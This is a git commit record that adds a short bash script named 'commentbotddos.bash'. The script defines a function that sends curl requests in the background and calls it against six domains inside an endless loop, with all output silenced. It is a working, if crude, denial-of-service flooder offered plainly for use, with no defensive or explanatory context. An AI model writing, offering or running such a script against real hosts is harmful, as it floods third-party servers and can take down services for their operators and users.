9d8e044ac49d02404b1840deba165da5e91dc94d
Brahma Sharma <59745725+Ganesha2282882@users.noreply.github.com>
2021-05-19 16:57:07 -0400

    Create commentbotddos.bash

---
+++ commentbotddos.bash
@@ -0,0 +1,11 @@
+block() {
+    curl $1 &
+}
+while :; do
+block injapp.com
+block instapwn.com
+block instaplekt.com
+block yotube.com
+block goggle.com
+block gamil.com
+done 1> /dev/null 2> /dev/null
